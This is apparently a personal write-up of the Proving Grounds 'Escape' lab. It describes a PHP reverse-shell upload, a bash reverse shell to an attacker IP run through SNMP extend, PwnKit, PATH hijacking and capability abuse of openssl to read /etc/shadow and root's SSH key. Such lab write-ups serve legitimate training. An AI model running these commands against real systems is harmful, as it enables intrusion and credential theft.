---
title: Escape
date: 2026-05-28T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - proving-grounds
  - SUID
  - getcap
  - Caido
  - openssl
  - http
  - snmp
  - snmpwalk
  - curl
  - gobuster
  - ssh
categories:
  - Pentesting
  - Offsec
  - Linux
description: "This guide provides readers with the solution to the Proving Grounds Lab: Escape"
---
“How did I escape? With difficulty. How did I plan this moment? With pleasure.”  
― Alexandre Dumas

nmap -p- 192.168.162.113 --min-rate 5000

![](Screenshot%202026-05-28%20at%2007.39.32.png)
![](Screenshot%202026-05-28%20at%2007.45.45.png)



![](Screenshot%202026-05-28%20at%2007.44.54.png)



![](Screenshot%202026-05-28%20at%2007.50.02.png)

![](Screenshot%202026-05-28%20at%2008.03.38.png)

Use Caido to upload a reverse shell file, changing the header to `image/gif`, once uploaded navigate to the uploads directory and filename. I got a little stuck here because I wanted to upload a gif to see what the request looked like. But, the gif I chose(a real gif) wouldn't trigger the upload. Any file should be able to be uploaded once you add the image/gif content-type.

I use Ivan's options because it works well most of the time. 

![](Screenshot%202026-05-30%20at%2008.25.43.png)

Create your malicious .php file and send it using the upload function.  
Send the request to replay in Caido. 
Change the 'application/x-php' to 'image/gif'.

![](Screenshot%202026-05-30%20at%2008.21.51.png)

Start a listener:  
`rlwrap nc -nvlp` 1334

Navigate to the file in the uploads directory:  
`http://8080/dev/uploads/escape.php`

![](Screenshot%202026-05-30%20at%2008.25.09.png)

![](Screenshot%202026-05-28%20at%2011.29.51.png)

After some enumeration and moving linpeas onto the machine  found this conf file....

![](Screenshot%202026-05-28%20at%2015.35.27.png)

![](Screenshot%202026-05-28%20at%2015.35.08.png)

This bit was quite difficult. I came across this file but didn't really know what to do with it. 
Read the file carefully, near the end it explains how to add functionality(execute code).

Create a file in the /tmp folder that called shtest. The /tmp folder has been mounted to the /tmp folder on the host machine. The snmpwalk will execute the contents of that file. 

`echo "bash -c 'bash -i >& /dev/tcp/192.168.45.242 0>&1'" > /tmp/shtest`

https://bestmonitoringtools.com/snmpwalk-example-v3-v2-snmpget-snmpset-snmptrap/

Install the MIB dowloader onto your kali machine
`sudo apt install mib-downloader`

Comment out `mibs :` on line 4:  
`vim /etc/snmp.conf`

![](Screenshot%202026-05-30%20at%2008.59.27.png)

`snmpwalk -v 2c -c 53cur3M0NiT0riNg 192.168.162.113`

![](Screenshot%202026-05-28%20at%2015.34.51.png)

This is what it looks like when you haven't installed the downloader ^^

snmpwalk -v 2c -c 53cur3M0NiT0riNg 192.168.162.113 nsExtendOutput2

![](Screenshot%202026-05-28%20at%2016.52.30.png)

![](Screenshot%202026-05-28%20at%2016.53.16.png)

Shell on host....

If you want root here:  
```
cd /tmp
git clone https://github.com/ly4k/PwnKit.git
chmod +x PwnKit.sh
./PwnKit.sh
```

If you're like me and enjoy smashing your genitals with a toilet seat, please continue....

Check for other users, check for files owned by users with elevated privs 

`cat /etc/passwd`
`find / -user tom -ls 2> /dev/null`

![](Screenshot%202026-05-30%20at%2015.57.01.png)

I needed help finding this. I pulled the binary from the victim machine looking for buffer overflows and secrets. 

![](Screenshot%202026-05-29%20at%2009.27.35.png)

`ltrace /usr/bin/logconsole`
Select: 6

![](Screenshot%202026-05-30%20at%2015.58.51.png)

This system call doesn't use a absolute path. We can add a /tmp to the start of $PATH so our new binary will get called first:  

`export PATH=/tmp:$PATH`

![](Screenshot%202026-05-30%20at%2016.27.59.png)

`echo "/bin/bash -i" > /tmp/lscpu`  
`chmod +x /tmp/lscpu`

![](Screenshot%202026-05-30%20at%2016.30.11.png)

`find / -group tom -ls 2>/dev/null`

![](Screenshot%202026-05-30%20at%2016.41.47.png)

This command will find any executables owned by a specific user:  
`find / -user tom -perm -u=x -type f 2>/dev/null`

![](Screenshot%202026-05-30%20at%2016.43.24.png)

`getcap /opt/cert/openssl`

![](Screenshot%202026-05-30%20at%2016.53.10.png)

This binary owned by tom has "All capabilities Enabled". E = Effective, P = Permitted.  

Running a binary configured with =ep grants the process the exact same operational authority as running a traditional SUID root binary. It can bypass standard file read/write permissions, modify process structures, and manipulate system settings.[gemini]

`getcap -r / -ls 2>/dev/null`

![](Screenshot%202026-05-30%20at%2017.25.23.png)

This attack requires interacting via a ssl server using keys created with the EP enabled binary. 

openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -nodes

![](Screenshot%202026-05-29%20at%2014.42.42.png)

Navigate to the root directory, `cd /` the server we create using openssl must sit on the root directory to be able to navigate to the file you wish to view.

/opt/cert/openssl s_server -key /dev/shm/key.pem -cert /dev/shm/cert.pem -port 4444 -HTTP &

![](Screenshot%202026-05-30%20at%2018.28.08.png)

`curl -k https://127.0.0.1:4444/etc/shadow`

![](Screenshot%202026-05-30%20at%2018.36.38.png)

`curl -k https://127.0.0.1:4444/root/.ssh/id_rsa`

![](Screenshot%202026-05-29%20at%2015.33.12.png)

Save, change privs connect via ssh:

`chmod 600 id_rsa`
`ssh -i id_rsa root@192.168.114.133`

![](Screenshot%202026-05-30%20at%2018.38.58.png)

"I am not a horse."